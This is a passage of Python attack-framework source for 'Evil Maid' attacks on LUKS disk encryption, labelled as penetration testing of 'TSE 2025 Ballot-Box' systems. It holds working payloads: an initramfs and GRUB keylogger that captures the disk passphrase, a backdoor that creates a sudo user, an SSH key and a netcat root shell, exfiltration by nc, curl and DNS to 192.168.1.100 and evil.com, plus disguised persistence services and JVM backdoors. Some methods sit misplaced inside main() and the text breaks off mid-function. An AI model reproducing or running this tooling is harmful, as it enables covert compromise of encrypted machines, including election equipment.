                mount_result = subprocess.run(['mount'], capture_output=True, text=True)
                if 'mapper' in mount_result.stdout and '/boot' in mount_result.stdout:
                    info['boot_from_luks'] = True
        
        except Exception:
            pass
        
        return info
    
    def _identify_attack_vectors(self, analysis: Dict) -> List[str]:
        """Identify viable attack vectors based on system analysis"""
        vectors = []
        
        # Initramfs modification
        if analysis.get('initramfs_found') and analysis.get('initramfs_modifiable'):
            vectors.append('INITRAMFS_INJECTION')
        
        # GRUB modification
        if analysis.get('grub_config_found') and analysis.get('grub_modifiable'):
            if not analysis.get('grub_password_protected'):
                vectors.append('GRUB_CONFIG_MODIFICATION')
        
        # Secure Boot bypass
        if not analysis.get('secure_boot_status'):
            vectors.append('SECURE_BOOT_BYPASS')
        
        # Boot partition replacement
        if not analysis.get('boot_from_luks'):
            vectors.append('BOOT_PARTITION_REPLACEMENT')
        
        # Kernel module injection
        vectors.append('KERNEL_MODULE_INJECTION')
        
        return vectors
    
    def _generate_attack_recommendations(self, analysis: Dict) -> List[str]:
        """Generate attack recommendations based on analysis"""
        recommendations = []
        
        if 'INITRAMFS_INJECTION' in analysis.get('attack_vectors', []):
            recommendations.append('Inject keylogger into initramfs during LUKS unlock')
        
        if 'GRUB_CONFIG_MODIFICATION' in analysis.get('attack_vectors', []):
            recommendations.append('Modify GRUB to capture passphrase before LUKS unlock')
        
        if 'SECURE_BOOT_BYPASS' in analysis.get('attack_vectors', []):
            recommendations.append('Replace bootloader with malicious version')
        
        if 'BOOT_PARTITION_REPLACEMENT' in analysis.get('attack_vectors', []):
            recommendations.append('Replace entire /boot partition with malicious version')
        
        return recommendations
    
    def create_malicious_initramfs(self, original_initramfs: str, 
                                 output_path: str, payload_type: str = 'keylogger') -> bool:
        """Create malicious initramfs with injected payload"""
        
        print(f"[INFO] Creating malicious initramfs from {original_initramfs}")
        
        try:
            # Extract original initramfs
            extract_dir = self.temp_dir / "initramfs_extract"
            extract_dir.mkdir(exist_ok=True)
            
            success = self._extract_initramfs(original_initramfs, str(extract_dir))
            if not success:
                return False
            
            # Inject payload
            if payload_type == 'keylogger':
                self._inject_keylogger_payload(str(extract_dir))
            elif payload_type == 'backdoor':
                self._inject_backdoor_payload(str(extract_dir))
            elif payload_type == 'exfiltrator':
                self._inject_exfiltration_payload(str(extract_dir))
            
            # Repack initramfs
            success = self._repack_initramfs(str(extract_dir), output_path, original_initramfs)
            
            return success
            
        except Exception as e:
            print(f"[ERROR] Failed to create malicious initramfs: {e}")
            return False
    
    def _extract_initramfs(self, initramfs_path: str, extract_dir: str) -> bool:
        """Extract initramfs contents"""
        
        compression = self._detect_initramfs_compression(initramfs_path)
        
        try:
            if compression == 'gzip':
                with gzip.open(initramfs_path, 'rb') as gz_file:
                    # Extract using cpio
                    cmd = ['cpio', '-i', '-d', '-H', 'newc', '--no-absolute-filenames']
                    result = subprocess.run(cmd, input=gz_file.read(), 
                                          cwd=extract_dir, check=True)
            
            elif compression == 'xz':
                cmd = ['xz', '-dc', initramfs_path]
                xz_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE)
                
                cpio_cmd = ['cpio', '-i', '-d', '-H', 'newc', '--no-absolute-filenames']
                subprocess.run(cpio_cmd, stdin=xz_proc.stdout, cwd=extract_dir, check=True)
                xz_proc.wait()
            
            elif compression is None:
                # Uncompressed
                with open(initramfs_path, 'rb') as f:
                    cmd = ['cpio', '-i', '-d', '-H', 'newc', '--no-absolute-filenames']
                    subprocess.run(cmd, input=f.read(), cwd=extract_dir, check=True)
            
            else:
                print(f"[ERROR] Unsupported compression: {compression}")
                return False
            
            print(f"[SUCCESS] Extracted initramfs to {extract_dir}")
            return True
            
        except Exception as e:
            print(f"[ERROR] Failed to extract initramfs: {e}")
            return False
    
    def _inject_keylogger_payload(self, extract_dir: str):
        """Inject keylogger payload into extracted initramfs"""
        
        # Create keylogger script
        keylogger_script = self._create_keylogger_script()
        
        # Inject into init process
        init_script_path = Path(extract_dir) / "init"
        
        if init_script_path.exists():
            # Backup original init
            shutil.copy(str(init_script_path), str(init_script_path) + ".orig")
            
            # Modify init script to include keylogger
            with open(init_script_path, 'r') as f:
                original_init = f.read()
            
            # Insert keylogger before cryptsetup call
            modified_init = self._modify_init_script(original_init, keylogger_script)
            
            with open(init_script_path, 'w') as f:
                f.write(modified_init)
            
            # Make sure it's executable
            os.chmod(str(init_script_path), 0o755)
            
            print("[INFO] Injected keylogger into init script")
        
        # Also inject into cryptsetup askpass helper if present
        askpass_paths = [
            Path(extract_dir) / "sbin" / "cryptsetup-askpass",
            Path(extract_dir) / "lib" / "cryptsetup" / "askpass"
        ]
        
        for askpass_path in askpass_paths:
            if askpass_path.exists():
                self._wrap_askpass_program(str(askpass_path), keylogger_script)
    
    def _create_keylogger_script(self) -> str:
        """Create keylogger script for capturing LUKS passphrase"""
        
        keylogger_code = '''#!/bin/bash
# Evil Maid Keylogger - LUKS Passphrase Capture

LOG_FILE="/tmp/.luks_capture"
EXFIL_FILE="/dev/.luks_exfil"

# Function to capture keyboard input
capture_input() {
    local prompt="$1"
    local input=""
    local char=""
    
    # Display original prompt
    echo -n "$prompt"
    
    # Capture input character by character
    while IFS= read -r -n1 char; do
        if [[ "$char" == "" ]]; then
            # Enter key pressed
            break
        elif [[ "$char" == $'\\x7f' ]]; then
            # Backspace
            if [[ ${#input} -gt 0 ]]; then
                input="${input%?}"
                echo -n $'\\b \\b'
            fi
        else
            input+="$char"
            echo -n "*"
        fi
    done
    
    echo  # New line
    
    # Log the captured input
    {
        echo "$(date): $input"
        echo "MD5: $(echo -n \"$input\" | md5sum | cut -d' ' -f1)"
        echo "---"
    } >> "$LOG_FILE" 2>/dev/null
    
    # Try to exfiltrate immediately
    {
        echo "LUKS_PASS: $input"
        echo "TIME: $(date)"
        echo "HOST: $(hostname)"
    } >> "$EXFIL_FILE" 2>/dev/null
    
    # Return the captured input
    echo "$input"
}

# Export function for use by other scripts
export -f capture_input
'''
        
        return keylogger_code
    
    def _modify_init_script(self, original_init: str, keylogger_script: str) -> str:
        """Modify init script to include keylogger functionality"""
        
        # Insert keylogger functions at the beginning
        modified_init = "#!/bin/sh\n"
        modified_init += "# Modified init script with keylogger\n\n"
        modified_init += keylogger_script + "\n\n"
        
        # Find cryptsetup calls and wrap them
        lines = original_init.split('\n')
        
        for i, line in enumerate(lines):
            if 'cryptsetup' in line and ('luksOpen' in line or 'open' in line):
                # Wrap cryptsetup call to capture passphrase
                wrapped_line = line.replace(
                    'cryptsetup',
                    'echo "Enter passphrase:" && PASSPHRASE=$(capture_input "Enter passphrase for LUKS: ") && echo "$PASSPHRASE" | cryptsetup --key-file=-'
                )
                lines[i] = wrapped_line
            
            elif '/lib/cryptsetup/askpass' in line or 'plymouth ask-for-password' in line:
                # Replace askpass with our capturing version
                lines[i] = line.replace('/lib/cryptsetup/askpass', 'capture_input')
        
        modified_init += '\n'.join(lines)
        
        return modified_init
    
    def _inject_backdoor_payload(self, extract_dir: str):
        """Inject backdoor payload for persistent access"""
        
        backdoor_script = '''#!/bin/bash
# Evil Maid Backdoor - Persistent Access

# Create backdoor user
useradd -m -s /bin/bash -G sudo evilmaid 2>/dev/null
echo 'evilmaid:password123' | chpasswd 2>/dev/null

# Install SSH backdoor
mkdir -p /home/evilmaid/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... evilmaid@backdoor' >> /home/evilmaid/.ssh/authorized_keys
chmod 600 /home/evilmaid/.ssh/authorized_keys
chown -R evilmaid:evilmaid /home/evilmaid/.ssh

# Create systemd service for persistence
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=forking
ExecStart=/bin/bash -c 'nohup nc -l -p 31337 -e /bin/bash &'
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl enable system-update.service 2>/dev/null
'''
        
        # Add to init script
        init_path = Path(extract_dir) / "init"
        if init_path.exists():
            with open(init_path, 'a') as f:
                f.write(f"\n# Backdoor installation\n{backdoor_script}\n")
    
    def _inject_exfiltration_payload(self, extract_dir: str):
        """Inject data exfiltration payload"""
        
        exfil_script = '''#!/bin/bash
# Evil Maid Exfiltration - Network Data Extraction

EXFIL_SERVER="192.168.1.100"
EXFIL_PORT="4444"

# Function to exfiltrate data
exfiltrate_data() {
    local data_file="$1"
    
    if [[ -f "$data_file" ]]; then
        # Try multiple exfiltration methods
        
        # Method 1: Netcat
        timeout 5 nc "$EXFIL_SERVER" "$EXFIL_PORT" < "$data_file" 2>/dev/null
        
        # Method 2: HTTP POST
        timeout 5 curl -X POST -d @"$data_file" "http://$EXFIL_SERVER:8080/upload" 2>/dev/null
        
        # Method 3: DNS exfiltration
        while read -r line; do
            timeout 2 nslookup "$(echo "$line" | base64 -w0).exfil.evil.com" 2>/dev/null
        done < "$data_file"
        
        # Method 4: Write to USB devices
        for usb_dev in /dev/sd[a-z]1; do
            if [[ -b "$usb_dev" ]]; then
                mkdir -p /tmp/usb_mount
                mount "$usb_dev" /tmp/usb_mount 2>/dev/null
                cp "$data_file" "/tmp/usb_mount/.system_logs" 2>/dev/null
                umount /tmp/usb_mount 2>/dev/null
            fi
        done
    fi
}

# Set up exfiltration hook
export -f exfiltrate_data

# Hook into network availability
(
    while true; do
        if ping -c1 "$EXFIL_SERVER" >/dev/null 2>&1; then
            exfiltrate_data "/tmp/.luks_capture"
            exfiltrate_data "/dev/.luks_exfil"
        fi
        sleep 30
    done
) &
'''
        
        # Add exfiltration to init
        init_path = Path(extract_dir) / "init"
        if init_path.exists():
            with open(init_path, 'a') as f:
                f.write(f"\n# Data exfiltration\n{exfil_script}\n")
    
    def _wrap_askpass_program(self, askpass_path: str, keylogger_script: str):
        """Wrap askpass program with keylogger"""
        
        # Backup original
        shutil.copy(askpass_path, askpass_path + ".orig")
        
        # Create wrapper script
        wrapper_script = f'''#!/bin/bash
# Wrapped askpass with keylogger

{keylogger_script}

# Call our capture function instead of original askpass
PROMPT="${{1:-Enter passphrase:}}"
PASSPHRASE=$(capture_input "$PROMPT")
echo "$PASSPHRASE"
'''
        
        with open(askpass_path, 'w') as f:
            f.write(wrapper_script)
        
        os.chmod(askpass_path, 0o755)
    
    def _repack_initramfs(self, extract_dir: str, output_path: str, 
                         original_path: str) -> bool:
        """Repack modified initramfs"""
        
        compression = self._detect_initramfs_compression(original_path)
        
        try:
            # Create new initramfs using cpio
            cpio_cmd = ['find', '.', '-print0']
            find_proc = subprocess.Popen(cpio_cmd, cwd=extract_dir, stdout=subprocess.PIPE)
            
            cpio_create_cmd = ['cpio', '--null', '-ov', '--format=newc']
            cpio_proc = subprocess.Popen(cpio_create_cmd, stdin=find_proc.stdout,
                                       stdout=subprocess.PIPE, cwd=extract_dir)
            
            find_proc.stdout.close()
            
            if compression == 'gzip':
                with gzip.open(output_path, 'wb') as gz_file:
                    gz_file.write(cpio_proc.communicate()[0])
            
            elif compression == 'xz':
                xz_cmd = ['xz', '--check=crc32', '--lzma2=dict=1MiB', '-']
                with open(output_path, 'wb') as out_file:
                    xz_proc = subprocess.Popen(xz_cmd, stdin=cpio_proc.stdout,
                                             stdout=out_file)
                    cpio_proc.stdout.close()
                    xz_proc.wait()
            
            elif compression is None:
                with open(output_path, 'wb') as out_file:
                    out_file.write(cpio_proc.communicate()[0])
            
            cpio_proc.wait()
            
            print(f"[SUCCESS] Repacked initramfs to {output_path}")
            return True
            
        except Exception as e:
            print(f"[ERROR] Failed to repack initramfs: {e}")
            return False
    
    def create_malicious_grub_config(self, original_grub: str, 
                                   output_path: str) -> bool:
        """Create malicious GRUB configuration"""
        
        try:
            with open(original_grub, 'r') as f:
                original_config = f.read()
            
            # Insert keylogger before cryptomount commands
            modified_config = self._modify_grub_config(original_config)
            
            with open(output_path, 'w') as f:
                f.write(modified_config)
            
            print(f"[SUCCESS] Created malicious GRUB config: {output_path}")
            return True
            
        except Exception as e:
            print(f"[ERROR] Failed to create malicious GRUB config: {e}")
            return False
    
    def _modify_grub_config(self, original_config: str) -> str:
        """Modify GRUB config to capture passphrase"""
        
        # Insert keylogger module load
        keylogger_entry = '''
# Evil Maid - Keylogger module
insmod keylayouts
insmod at_keyboard
insmod usb_keyboard

# Function to capture cryptomount passphrase
function evil_cryptomount {
    echo "Enter passphrase for encrypted volume:"
    read -s passphrase
    
    # Log passphrase (hidden location)
    echo "$passphrase" > (hd0,1)/.system_log
    
    # Use passphrase with cryptomount
    echo "$passphrase" | cryptomount -u $1
}
'''
        
        # Replace cryptomount calls with evil_cryptomount
        modified_config = original_config.replace(
            'cryptomount -u',
            'evil_cryptomount'
        )
        
        # Insert keylogger code at the beginning
        lines = modified_config.split('\n')
        insert_index = 0
        
        # Find a good place to insert (after initial setup)
        for i, line in enumerate(lines):
            if line.strip().startswith('set timeout') or line.strip().startswith('if'):
                insert_index = i
                break
        
        lines.insert(insert_index, keylogger_entry)
        
        return '\n'.join(lines)
    
    def deploy_evil_maid_attack(self, target_device: str, attack_type: str) -> bool:
        """Deploy complete Evil Maid attack"""
        
        print(f"[INFO] Deploying Evil Maid attack: {attack_type}")
        
        # Analyze target first
        analysis = self.analyze_boot_chain(target_device)
        
        if attack_type not in analysis.get('attack_vectors', []):
            print(f"[ERROR] Attack vector {attack_type} not viable for this target")
            return False
        
        try:
            if attack_type == 'INITRAMFS_INJECTION':
                return self._deploy_initramfs_attack(analysis)
            
            elif attack_type == 'GRUB_CONFIG_MODIFICATION':
                return self._deploy_grub_attack(analysis)
            
            elif attack_type == 'BOOT_PARTITION_REPLACEMENT':
                return self._deploy_boot_replacement_attack(analysis)
            
            else:
                print(f"[ERROR] Unknown attack type: {attack_type}")
                return False
                
        except Exception as e:
            print(f"[ERROR] Attack deployment failed: {e}")
            return False
    
    def _deploy_initramfs_attack(self, analysis: Dict) -> bool:
        """Deploy initramfs injection attack"""
        
        # Find initramfs file
        initramfs_path = None
        for path in ['/boot/initrd.img', f'/boot/initrd.img-{os.uname().release}']:
            if Path(path).exists():
                initramfs_path = path
                break
        
        if not initramfs_path:
            print("[ERROR] No initramfs found")
            return False
        
        # Create malicious initramfs
        malicious_path = str(self.temp_dir / "evil_initrd.img")
        success = self.create_malicious_initramfs(initramfs_path, malicious_path)
        
        if success:
            # Backup original and replace
            backup_path = initramfs_path + ".orig"
            shutil.copy(initramfs_path, backup_path)
            shutil.copy(malicious_path, initramfs_path)
            
            print(f"[SUCCESS] Deployed malicious initramfs")
            print(f"[INFO] Original backed up to {backup_path}")
            return True
        
        return False
    
    def _deploy_grub_attack(self, analysis: Dict) -> bool:
        """Deploy GRUB configuration attack"""
        
        grub_path = '/boot/grub/grub.cfg'
        if not Path(grub_path).exists():
            grub_path = '/boot/grub2/grub.cfg'
        
        if not Path(grub_path).exists():
            print("[ERROR] GRUB config not found")
            return False
        
        # Create malicious GRUB config
        malicious_path = str(self.temp_dir / "evil_grub.cfg")
        success = self.create_malicious_grub_config(grub_path, malicious_path)
        
        if success:
            # Backup and replace
            backup_path = grub_path + ".orig"
            shutil.copy(grub_path, backup_path)
            shutil.copy(malicious_path, grub_path)
            
            print(f"[SUCCESS] Deployed malicious GRUB config")
            print(f"[INFO] Original backed up to {backup_path}")
            return True
        
        return False
    
    def _deploy_boot_replacement_attack(self, analysis: Dict) -> bool:
        """Deploy complete boot partition replacement"""
        
        print("[INFO] Boot partition replacement attack not fully implemented")
        print("[INFO] This would involve creating a complete malicious boot environment")
        
        # This would involve:
        # 1. Creating a malicious Linux distribution
        # 2. Setting up a fake LUKS unlock interface
        # 3. Replacing the entire boot partition
        # 4. Ensuring the fake environment looks identical to the original
        
        return False
    
    def cleanup(self):
        """Cleanup temporary files"""
        try:
            shutil.rmtree(str(self.temp_dir))
            print("[INFO] Cleanup completed")
        except Exception as e:
            print(f"[WARNING] Cleanup failed: {e}")


def main():
    parser = argparse.ArgumentParser(description='Evil Maid Attack Framework v2.0 for LUKS FDE - TSE 2025 Ballot-Box Penetration Testing')
    parser.add_argument('action', choices=['analyze', 'create-initramfs', 'create-grub', 'deploy', 
                       'reconnaissance', 'advanced-keylogger', 'persistence', 'jvm-backdoor', 
                       'collect-results', 'full-attack'])
    parser.add_argument('-d', '--device', help='Target LUKS device')
    parser.add_argument('-i', '--input', help='Input file (original initramfs/grub config)')
    parser.add_argument('-o', '--output', help='Output file (malicious version)')
    parser.add_argument('-t', '--type', choices=['keylogger', 'backdoor', 'exfiltrator', 'advanced'],
                       default='keylogger', help='Payload type')
    parser.add_argument('--attack-vector', choices=['INITRAMFS_INJECTION', 'GRUB_CONFIG_MODIFICATION', 
                       'BOOT_PARTITION_REPLACEMENT', 'ADVANCED_KEYLOGGER', 'JVM_BACKDOOR', 
                       'PERSISTENCE_MANAGER'], help='Attack vector to deploy')
    parser.add_argument('--mount-point', default='/mnt/evil_target', help='Mount point for target system')
    parser.add_argument('--interactive', action='store_true', help='Run in interactive mode')
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[WARNING] Many operations require root privileges")
    
    framework = EvilMaidAttackFramework()
    
    try:
        if args.action == 'analyze':
            print("[INFO] Analyzing boot chain for Evil Maid attack vectors...")
            analysis = framework.analyze_boot_chain(args.device)
            
            print("\n[BOOT CHAIN ANALYSIS]")
            print(f"Boot Method: {analysis['boot_method']}")
            print(f"Secure Boot: {analysis['secure_boot_status']}")
            print(f"LUKS Detected: {analysis.get('luks_detected', 'N/A')}")
            print(f"TPM Present: {analysis['tpm_present']}")
            
            print(f"\nAttack Vectors:")
            for vector in analysis.get('attack_vectors', []):
                print(f"  • {vector}")
            
            print(f"\nRecommendations:")
            for rec in analysis.get('recommendations', []):
                print(f"  • {rec}")
        
        elif args.action == 'create-initramfs':
            if not args.input or not args.output:
                print("[ERROR] Input and output files required")
                return
            
            success = framework.create_malicious_initramfs(args.input, args.output, args.type)
            if success:
                print(f"[SUCCESS] Malicious initramfs created: {args.output}")
        
        elif args.action == 'create-grub':
            if not args.input or not args.output:
                print("[ERROR] Input and output files required")
                return
            
            success = framework.create_malicious_grub_config(args.input, args.output)
            if success:
                print(f"[SUCCESS] Malicious GRUB config created: {args.output}")
        
        elif args.action == 'deploy':
            if not args.device or not args.attack_vector:
                print("[ERROR] Device and attack vector required")
                return
            
            success = framework.deploy_evil_maid_attack(args.device, args.attack_vector)
            if success:
                print("[SUCCESS] Evil Maid attack deployed")
            else:
                print("[ERROR] Attack deployment failed")
                
        elif args.action == 'reconnaissance':
            print("[INFO] Executando reconnaissance avançado...")
            success = framework.run_reconnaissance()
            if success:
                print("[SUCCESS] Reconnaissance concluído")
            else:
                print("[ERROR] Falha no reconnaissance")
                
        elif args.action == 'advanced-keylogger':
            print("[INFO] Instalando keylogger avançado...")
            success = framework.deploy_advanced_keylogger()
            if success:
                print("[SUCCESS] Keylogger avançado instalado")
            else:
                print("[ERROR] Falha na instalação do keylogger")
                
        elif args.action == 'persistence':
            print("[INFO] Instalando mecanismos de persistência...")
            success = framework.install_persistence()
            if success:
                print("[SUCCESS] Persistência instalada")
            else:
                print("[ERROR] Falha na instalação da persistência")
                
        elif args.action == 'jvm-backdoor':
            print("[INFO] Executando ataques de backdoor JVM...")
            success = framework.run_jvm_backdoor_attack()
            if success:
                print("[SUCCESS] Backdoor JVM instalado")
            else:
                print("[ERROR] Falha no backdoor JVM")
                
        elif args.action == 'collect-results':
            print("[INFO] Coletando resultados do ataque...")
            success = framework.collect_results()
            if success:
                print("[SUCCESS] Resultados coletados")
            else:
                print("[ERROR] Falha na coleta de resultados")
                
        elif args.action == 'full-attack':
            print("[INFO] Executando sequência completa de ataque Evil Maid...")
            print("[WARNING] Esta operação pode ser destrutiva!")
            
            confirm = input("Tem certeza que deseja continuar? [y/N]: ")
            if confirm.lower() != 'y':
                print("[INFO] Operação cancelada pelo usuário")
                return
                
            success = framework.full_advanced_attack_sequence()
            if success:
                print("[SUCCESS] Sequência completa de ataque concluída")
            else:
                print("[ERROR] Falha na sequência de ataque")
    
    finally:
        framework.cleanup()

    def run_reconnaissance(self):
        """
        Executar reconnaissance avançado usando script dedicado
        """
        print("\n[RECONNAISSANCE] Executando análise avançada do sistema...")
        
        if not self.reconnaissance_script.exists():
            print(f"[ERROR] Script de reconnaissance não encontrado: {self.reconnaissance_script}")
            return False
            
        try:
            result = subprocess.run([str(self.reconnaissance_script)], 
                                  capture_output=True, text=True, check=True)
            
            print("[SUCCESS] Reconnaissance concluído com sucesso")
            print(result.stdout)
            
            # Salvar relatório
            recon_report = self.results_dir / f"reconnaissance_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(recon_report, 'w') as f:
                f.write(result.stdout)
                
            print(f"[INFO] Relatório salvo em: {recon_report}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Falha no reconnaissance: {e}")
            print(f"[ERROR] Output: {e.stdout}")
            print(f"[ERROR] Error: {e.stderr}")
            return False

    def deploy_advanced_keylogger(self):
        """
        Instalar keylogger avançado em C
        """
        print("\n[KEYLOGGER] Instalando keylogger avançado...")
        
        if not self.keylogger_binary.exists():
            print(f"[ERROR] Keylogger não encontrado: {self.keylogger_binary}")
            print("[INFO] Execute 'gcc -o keylogger keylogger.c -lpthread' para compilar")
            return False
            
        try:
            # Copiar keylogger para sistema alvo
            target_keylogger = self.mount_path / "usr/local/bin/system_monitor"
            target_keylogger.parent.mkdir(parents=True, exist_ok=True)
            
            shutil.copy2(self.keylogger_binary, target_keylogger)
            os.chmod(target_keylogger, 0o755)
            
            print(f"[SUCCESS] Keylogger instalado como: {target_keylogger}")
            
            # Criar serviço systemd para o keylogger
            systemd_service = self.mount_path / "etc/systemd/system/system-monitor.service"
            systemd_service.parent.mkdir(parents=True, exist_ok=True)
            
            service_content = """[Unit]
Description=System Hardware Monitor
After=multi-user.target

[Service]
Type=forking
ExecStart=/usr/local/bin/system_monitor --daemon
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
            
            with open(systemd_service, 'w') as f:
                f.write(service_content)
                
            print(f"[SUCCESS] Serviço systemd criado: {systemd_service}")
            
            # Habilitar serviço
            enable_link = self.mount_path / "etc/systemd/system/multi-user.target.wants/system-monitor.service"
            enable_link.parent.mkdir(parents=True, exist_ok=True)
            
            if enable_link.exists():
                enable_link.unlink()
            enable_link.symlink_to("../system-monitor.service")
            
            print("[SUCCESS] Keylogger configurado para inicialização automática")
            return True
            
        except Exception as e:
            print(f"[ERROR] Falha ao instalar keylogger: {e}")
            return False

    def install_persistence(self):
        """
        Instalar mecanismos de persistência usando persistence manager
        """
        print("\n[PERSISTENCE] Instalando mecanismos de persistência...")
        
        if not self.persistence_manager.exists():
            print(f"[ERROR] Script de persistência não encontrado: {self.persistence_manager}")
            return False
            
        try:
            # Copiar persistence manager para sistema alvo
            target_persistence = self.mount_path / "usr/local/bin/system_backup"
            target_persistence.parent.mkdir(parents=True, exist_ok=True)
            
            shutil.copy2(self.persistence_manager, target_persistence)
            os.chmod(target_persistence, 0o755)
            
            print(f"[SUCCESS] Persistence manager instalado: {target_persistence}")
            
            # Criar script de inicialização
            init_script = self.mount_path / "etc/init.d/system-backup"
            init_script.parent.mkdir(parents=True, exist_ok=True)
            
            init_content = f"""#!/bin/bash
# System Backup Service
# chkconfig: 35 99 99
# description: System backup and monitoring

. /etc/rc.d/init.d/functions

USER="root"
DAEMON="system_backup"
ROOT_DIR="/usr/local/bin"

SERVER="$$ROOT_DIR/$$DAEMON"
LOCK_FILE="/var/lock/subsys/system-backup"

do_start() {{
    if [ ! -f "$$LOCK_FILE" ] ; then
        echo -n $$"Starting $$DAEMON: "
        runuser -l "$$USER" -c "$$SERVER" && echo_success || echo_failure
        RETVAL=$$?
        echo
        [ $$RETVAL -eq 0 ] && touch $$LOCK_FILE
    else
        echo "$$DAEMON is locked."
    fi
}}
do_stop() {{
    echo -n $$"Shutting down $$DAEMON: "
    pid=`ps -aefw | grep "$$DAEMON" | grep -v " grep " | awk '{{print $$2}}'`
    kill -9 $$pid > /dev/null 2>&1
    [ $$? -eq 0 ] && echo_success || echo_failure
    RETVAL=$$?
    echo
    [ $$RETVAL -eq 0 ] && rm -f $$LOCK_FILE
}}

case "$$1" in
    start)
        do_start
        ;;
    stop)
        do_stop
        ;;
    restart)
        do_stop
        do_start
        ;;
    *)
        echo "Usage: $$0 {{start|stop|restart}}"
        RETVAL=1
esac

exit $$RETVAL
"""
            
            with open(init_script, 'w') as f:
                f.write(init_content)
            os.chmod(init_script, 0o755)
            
            print(f"[SUCCESS] Script de inicialização criado: {init_script}")
            
            # Adicionar ao crontab
            cron_entry = self.mount_path / "etc/cron.d/system-backup"
            cron_entry.parent.mkdir(parents=True, exist_ok=True)
            
            cron_content = """# System backup cron job
*/15 * * * * root /usr/local/bin/system_backup collect >/dev/null 2>&1
0 3 * * * root /usr/local/bin/system_backup cleanup >/dev/null 2>&1
"""
            
            with open(cron_entry, 'w') as f:
                f.write(cron_content)
                
            print("[SUCCESS] Cron jobs de persistência instalados")
            return True
            
        except Exception as e:
            print(f"[ERROR] Falha ao instalar persistência: {e}")
            return False

    def collect_results(self):
        """
        Coletar resultados usando results collector
        """
        print("\n[COLLECTION] Coletando resultados do ataque...")
        
        if not self.results_collector.exists():
            print(f"[ERROR] Script de coleta não encontrado: {self.results_collector}")
            return False
            
        try:
            result = subprocess.run([str(self.results_collector), "complete"], 
                                  capture_output=True, text=True, check=True)
            
            print("[SUCCESS] Coleta de resultados concluída")
            print(result.stdout)
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Falha na coleta: {e}")
            print(f"[ERROR] Output: {e.stdout}")
            print(f"[ERROR] Error: {e.stderr}")
            return False

    def run_advanced_initramfs_attack(self):
        """
        Executar ataque avançado ao initramfs usando script especializado
        """
        print("\n[INITRAMFS ATTACK] Executando ataque avançado ao initramfs...")
        
        if not self.initramfs_attack.exists():
            print(f"[ERROR] Script de ataque initramfs não encontrado: {self.initramfs_attack}")
            return False
            
        try:
            # Passar parâmetros necessários
            env = os.environ.copy()
            env['MOUNT_POINT'] = str(self.mount_path)
            env['TARGET_DEVICE'] = str(self.mount_path.parent)
            
            result = subprocess.run([str(self.initramfs_attack)], 
                                  env=env, capture_output=True, text=True, check=True)
            
            print("[SUCCESS] Ataque ao initramfs concluído")
            print(result.stdout)
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Falha no ataque initramfs: {e}")
            print(f"[ERROR] Output: {e.stdout}")
            print(f"[ERROR] Error: {e.stderr}")
            return False

    def run_jvm_backdoor_attack(self):
        """
        Executar ataque de backdoor JVM usando script especializado
        """
        print("\n[JVM BACKDOOR] Executando ataque de backdoor Java...")
        
        if not self.jvm_backdoor.exists():
            print(f"[ERROR] Script de backdoor JVM não encontrado: {self.jvm_backdoor}")
            return False
            
        try:
            # Procurar por aplicações Java no sistema alvo
            java_apps = []
            for jar_file in self.mount_path.glob("**/*.jar"):
                java_apps.append(str(jar_file))
                
            if not java_apps:
                print("[WARN] Nenhuma aplicação Java encontrada no sistema alvo")
                return True
                
            print(f"[INFO] Encontradas {len(java_apps)} aplicações Java")
            
            # Executar backdoor para cada aplicação
            env = os.environ.copy()
            env['MOUNT_POINT'] = str(self.mount_path)
            
            for jar_app in java_apps[:5]:  # Limitar a 5 aplicações
                print(f"[INFO] Atacando aplicação: {jar_app}")
                env['TARGET_JAR'] = jar_app
                
                result = subprocess.run([str(self.jvm_backdoor), jar_app], 
                                      env=env, capture_output=True, text=True)
                
                if result.returncode == 0:
                    print(f"[SUCCESS] Backdoor instalado em: {jar_app}")
                else:
                    print(f"[WARN] Falha no backdoor para: {jar_app}")
                    
            return True
            
        except Exception as e:
            print(f"[ERROR] Falha no ataque JVM: {e}")
            return False

    def full_advanced_attack_sequence(self):
        """
        Executar sequência completa de ataque usando todas as ferramentas avançadas
        """
        print("\n" + "="*80)
        print("INICIANDO SEQUÊNCIA COMPLETA DE EVIL MAID ATTACK")
        print("TSE 2025 Ballot-Box TPU System LUKS Penetration Testing")
        print("="*80)
        
        success_count = 0
        total_steps = 8
        
        # Passo 1: Reconnaissance
        print(f"\n[PASSO 1/{total_steps}] RECONNAISSANCE AVANÇADO")
        if self.run_reconnaissance():
            success_count += 1
            
        # Passo 2: Análise de boot chain
        print(f"\n[PASSO 2/{total_steps}] ANÁLISE DE BOOT CHAIN")
        boot_analysis = self.analyze_boot_chain()
        if boot_analysis:
            success_count += 1
            
        # Passo 3: Ataque ao initramfs
        print(f"\n[PASSO 3/{total_steps}] ATAQUE AVANÇADO AO INITRAMFS")
        if self.run_advanced_initramfs_attack():
            success_count += 1
            
        # Passo 4: Modificação do GRUB
        print(f"\n[PASSO 4/{total_steps}] MODIFICAÇÃO DO GRUB")
        if self.modify_grub_config():
            success_count += 1
            
        # Passo 5: Keylogger avançado
        print(f"\n[PASSO 5/{total_steps}] INSTALAÇÃO DE KEYLOGGER AVANÇADO")
        if self.deploy_advanced_keylogger():
            success_count += 1
            
        # Passo 6: Backdoor JVM
        print(f"\n[PASSO 6/{total_steps}] BACKDOOR JAVA/JVM")
        if self.run_jvm_backdoor_attack():
            success_count += 1
            
        # Passo 7: Persistência avançada
        print(f"\n[PASSO 7/{total_steps}] INSTALAÇÃO DE PERSISTÊNCIA")
        if self.install_persistence():
            success_count += 1
            
        # Passo 8: Coleta de resultados
        print(f"\n[PASSO 8/{total_steps}] COLETA DE RESULTADOS")
        if self.collect_results():
            success_count += 1
            
        # Relatório final
        print("\n" + "="*80)
        print("RELATÓRIO FINAL DO ATAQUE EVIL MAID")
        print("="*80)
        print(f"Passos executados com sucesso: {success_count}/{total_steps}")
        print(f"Taxa de sucesso: {(success_count/total_steps)*100:.1f}%")
        
        if success_count >= 6:
